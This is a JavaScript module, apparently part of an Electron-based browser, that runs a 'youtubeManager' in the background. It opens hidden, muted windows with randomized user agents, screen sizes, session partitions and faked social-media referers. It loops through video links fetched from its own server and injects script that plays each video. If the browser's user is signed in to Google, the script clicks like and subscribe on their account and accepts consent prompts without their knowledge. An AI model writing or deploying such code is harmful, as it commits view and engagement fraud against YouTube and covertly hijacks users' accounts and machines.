(function (w) {
    if (w.MYSERVERYOUTUBESCRIPT_LOADED) {
        console.log('MYSERVERYOUTUBESCRIPT Aborting 0 ...');
        return;
    }

    w.MYSERVERYOUTUBESCRIPT_LOADED = true;
    w.MYSERVERYOUTUBESCRIPT = true;

    SOCIALBROWSER.var.blocking.youtube.quality = {
        name: 'medium',
        value: '360',
    };
    SOCIALBROWSER.youtubeManager = {
        currentIndex: 0,
        visitOptions: { show: false, timeout: 1000 * 60 * 20, url: 'https://www.youtube.com/watch?v=PpDoLqPZg5M', host: 'youtube', referer: 'dynamic', proxy: null, partition: null, scroll: true },
        visitList: [
            { title: 'sharepoint admin 2016', url: 'https://bit.ly/34p86d9', timeout: 1000 * 60 * 65 },
            { title: 'nodejs chat', url: 'https://bit.ly/3w5T5JH', timeout: 1000 * 60 * 50 },
            { title: 'MVC 5 Review', url: 'https://bit.ly/3wmkQhd', timeout: 1000 * 60 * 75 },
            { title: 'c# Review', url: 'https://bit.ly/2SKI9CG', timeout: 1000 * 60 * 75 },
            { title: 'c# winforms Review', url: 'https://bit.ly/3qpT015', timeout: 1000 * 60 * 75 },
            { title: 'ازاى المواقع بتعرف انت مين وازى تخفى هويتك اثناء التصفح', url: 'https://bit.ly/3aBjyoX', timeout: 1000 * 60 * 30 },
            { title: 'متصفح لحماية الاطفال ومانع للاعلانات', url: 'https://bit.ly/3sqPXGv', timeout: 1000 * 60 * 20 },
            { title: 'زيادة مشاهدات اليوتيوب addmefast', url: 'https://bit.ly/3nYMBqY', timeout: 1000 * 60 * 15 },
            { title: 'برنامج نقاط البيع - السعر والمميزات', url: 'https://bit.ly/3senq6h', timeout: 1000 * 60 * 41 },
            { title: 'برنامج نقاط البيع - تركيب وتشغيل', url: 'https://bit.ly/2Nqnnpd', timeout: 1000 * 60 * 9 },
            { title: 'برنامج نقاط البيع - الاعدادات', url: 'https://bit.ly/3qEtQeL', timeout: 1000 * 60 * 36 },
            { title: 'scripts now - download', url: 'https://bit.ly/3qIL62c', timeout: 1000 * 60 * 2 },
        ],
        refererList: [
            'https://flipboard.com/',
            'https://vk.com/',
            'https://getpocket.com/',
            'https://digg.com/video',
            'https://www.pinterest.com/',
            'https://www.linkedin.com/',
            'https://www.reddit.com/',
            'https://twitter.com/',
            'https://www.tiktok.com/',
            'https://qzone.qq.com/',
            'https://www.tumblr.com/',
            'https://www.instagram.com/',
            'https://web.wechat.com/?lang=en',
            'https://web.whatsapp.com/',
            'https://www.facebook.com/',
        ],
        userAgentList: [],
        scrrenSizeList: ['1366x768', '1280x768', '1280x768', '1280x768', '1024x768', '1280x720', '1366x768', '1280x768'],
        randomScreenSize: function () {
            return SOCIALBROWSER.youtubeManager.scrrenSizeList[Math.floor(Math.random() * SOCIALBROWSER.youtubeManager.scrrenSizeList.length)];
        },
        randomUserAgent: function () {
            return SOCIALBROWSER.var.user_agent_list[Math.floor(Math.random() * SOCIALBROWSER.var.user_agent_list.length)];
        },
        randomReferer: function () {
            return SOCIALBROWSER.youtubeManager.refererList[Math.floor(Math.random() * SOCIALBROWSER.youtubeManager.refererList.length)];
        },
        randomPartition: function () {
            return SOCIALBROWSER.var.session_list[Math.floor(Math.random() * SOCIALBROWSER.var.session_list.length)].name;
        },
        randomVisit: function () {
            if (SOCIALBROWSER.youtubeManager.visitList.length > 0) {
                return SOCIALBROWSER.youtubeManager.visitList[Math.floor(Math.random() * SOCIALBROWSER.youtubeManager.visitList.length)];
            } else {
                return SOCIALBROWSER.youtubeManager.visitOptions;
            }
        },
        prepareVisits: function () {
            SOCIALBROWSER.fetchJson(
                {
                    url: SOCIALBROWSER.server_url + '/api/youtube_list',
                    method: 'GET',
                },
                function (data) {
                    if (data.done && data.list && data.list.length > 0) {
                        SOCIALBROWSER.youtubeManager.visitList = [];
                        data.list.forEach((v) => {
                            SOCIALBROWSER.youtubeManager.visitList.push(v);
                        });
                    }
                },
            );
        },
    };

    SOCIALBROWSER.youtubeManager.createFakeVisitWindow = function (op) {
        let options = { ...SOCIALBROWSER.youtubeManager.visitOptions, ...op };
        let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

        let scrren_size = SOCIALBROWSER.youtubeManager.randomScreenSize().split('x');

        let win = new SOCIALBROWSER.remote.BrowserWindow({
            show: options.show,
            width: parseInt(scrren_size[0] || '1366'),
            height: parseInt(scrren_size[1] || '768'),
            skipTaskbar: true,
            webPreferences: {
                sandbox: false,
                contextIsolation: false,
                enableRemoteModule: true,
                nodeIntegrationInSubFrames: false,
                partition: options.partition || SOCIALBROWSER.youtubeManager.randomPartition(),
                webaudio: false,
                webSecurity: true,
                allowRunningInsecureContent: false,
                preload: preload,
            },
        });

        win.webContents.audioMuted = true;

        win.webContents.userAgent = options.userAgent || SOCIALBROWSER.youtubeManager.randomUserAgent().url;

        if (SOCIALBROWSER.var.core.id.like('*test*')) {
            win.setSkipTaskbar(false);
            win.showInactive();
            win.openDevTools();
        } else {
            if (options.show) {
                win.maximize();
            } else {
                win.hide();
            }
        }

        win.setMenuBarVisibility(false);
        if (options.proxy) {
            const ss = win.webContents.session;
            ss.setProxy(
                {
                    proxyRules: options.proxy,
                    proxyBypassRules: '127.0.0.1',
                },
                function () {},
            );
        }
        if (options.referer == 'dynamic') {
            options.referer = SOCIALBROWSER.youtubeManager.randomReferer();
        }

        let code_injected = `if (!window.SOCIALBROWSER) {
    window.SOCIALBROWSER = {
        var: {
            core: { id: '' },
            blocking: {
                core: {},
                youtube: {},
            },
        },
        isIframe: () => {
            try {
                return window.self !== window.top;
            } catch (e) {
                return true;
            }
        },
    };
}

window.open = function (url) {
    if (!url || url == 'about:blank') {
        return;
    }
    console.log(' [ window.open ] ' + url);
    setTimeout(function () {
        document.location.href = url;
    }, 5 * 1000);
};

localStorage.clear = () => {
    console.log('User Request Clear LocalStorage');
};
` +  `console.log(' [ YOUTUBE ] ');

if (SOCIALBROWSER && SOCIALBROWSER.var) {
    SOCIALBROWSER.var.blocking.core = SOCIALBROWSER.var.blocking.core || {};
    SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
    SOCIALBROWSER.var.blocking.youtube = SOCIALBROWSER.var.blocking.youtube || {};
    SOCIALBROWSER.var.blocking.youtube.skip_ads = false;
}

window.open = function () {
    return {};
};

function __document__ready__() {
    if (document.location.host.indexOf('${options.host}') == -1) {
        let a = document.createElement('a');
        a.href = '${options.url}';
        a.id = '__a_injected';
        a.innerHTML = '${options.url}';
        a.setAttribute('target', '_self');
        let body = document.querySelector('body');
        if (body) {
            body.appendChild(a);
            a.style.backgroundColor = 'red';
            a.style.color = '#ffffff';
            a.style.fontSize = '22px';
            a.scrollIntoView();

            setTimeout(function () {
                document.querySelector('#__a_injected').click();
            }, 10 * 1000);
        }

        setTimeout(function () {
            document.location.href = '${options.url}';
        }, 20 * 1000);
    } else {
        setInterval(() => {
            if (SOCIALBROWSER.video_player) {
                SOCIALBROWSER.video_player.playVideo();
            }

            document.querySelectorAll('a.yt-simple-endpoint.style-scope.yt-button-renderer').forEach((d, i) => {
                if (i == 0) {
                    d.click();
                }
            });
            document.querySelectorAll('iron-overlay-backdrop').forEach((d) => d.remove());
            document.querySelectorAll('#dialog').forEach((d) => d.remove());

            let is_user_login = document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
            if (is_user_login) {
                let like_btn = document.querySelector('#top-level-buttons ytd-toggle-button-renderer');
                if (like_btn && !like_btn.className.like('*style-default-active*')) {
                    let a = like_btn.querySelector('a');
                    if (a) {
                        a.click();
                    }
                }

                let subscribed_btn = document.querySelector('#subscribe-button.style-scope.ytd-video-secondary-info-renderer paper-button');
                if (subscribed_btn && !subscribed_btn.hasAttribute('subscribed')) {
                    subscribed_btn.click();
                }
            }

            if (document.location.href.indexOf('consent') !== -1) {
                let btn = document.querySelector('form input[type=submit]') || document.querySelector('form button');
                if (btn) {
                    btn.click();
                }
            }
        }, 1000 * 5);

        if (SOCIALBROWSER && SOCIALBROWSER.setPlaybackQuality) {
            SOCIALBROWSER.var.blocking.youtube.quality = SOCIALBROWSER.var.video_quality_list[2];
            SOCIALBROWSER.setPlaybackQuality();
        }
    }
}

if (document.readyState !== 'loading') {
    __document__ready__();
} else {
    document.addEventListener('DOMContentLoaded', () => {
        __document__ready__();
    });
}
`;

        if (SOCIALBROWSER.var.core.version < '2021.03.01') {
            win.webContents.addListener('dom-ready', function (event) {
                win.webContents.executeJavaScript(code_injected);
            });
        } else {
            SOCIALBROWSER.call('[set][window][setting]', {
                win_id: win.id,
                name: 'youtube-view',
                options: options,
            });
            SOCIALBROWSER.call('[set][window][setting]', {
                win_id: win.id,
                name: 'eval',
                code: code_injected,
            });
        }

        win.loadURL(options.referer).catch((err) => {
            if (err.code === 'ERR_ABORTED') {
            }
        });

        win.on('close', function () {
            win.destroy();
        });

        win.on('closed', function () {
            SOCIALBROWSER.youtubeManager.runFakeVisit();
        });

        win.webContents.on('did-fail-load', function (e) {
            if (e.isMainFrame) {
                win.destroy();
            }
        });

        win.webContents.session.on('will-download', (event, item, webContents) => {
            event.preventDefault();
        });

        setTimeout(function () {
            if (win && !win.isDestroyed()) {
                win.destroy();
            }
        }, options.timeout);
    };

    SOCIALBROWSER.youtubeManager.runFakeVisit = function () {
        setTimeout(() => {
            SOCIALBROWSER.youtubeManager.createFakeVisitWindow(SOCIALBROWSER.youtubeManager.randomVisit());
        }, 1000 * 60 * 5); /** for cpu relax */
    };

    SOCIALBROWSER.youtubeManager.prepareVisits();
    SOCIALBROWSER.youtubeManager.runFakeVisit();

    setInterval(() => {
        SOCIALBROWSER.youtubeManager.prepareVisits();
    }, 1000 * 60 * 50);
})(window);
